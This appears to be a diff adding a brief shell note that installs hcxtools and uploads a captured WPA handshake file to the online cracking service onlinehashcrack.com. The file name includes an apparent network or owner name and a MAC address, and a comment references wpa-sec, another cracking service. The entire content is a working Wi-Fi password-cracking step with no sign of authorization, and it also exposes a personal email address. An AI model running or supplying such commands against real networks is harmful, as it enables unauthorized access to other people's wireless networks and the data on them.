@@ -1,0 +1,5 @@
+sudo apt install hcxtools
+
+wlancap2wpasec -u https://api.onlinehashcrack.com  -e maheratiles@gmail.com /home/ittadmin/Reports/handshakes/handshake_PEREZRAMIREZ_28-11-EC-94-60-58_2022-02-20T21-54-47.cap
+
+#https://wpa-sec.stanev.org/?
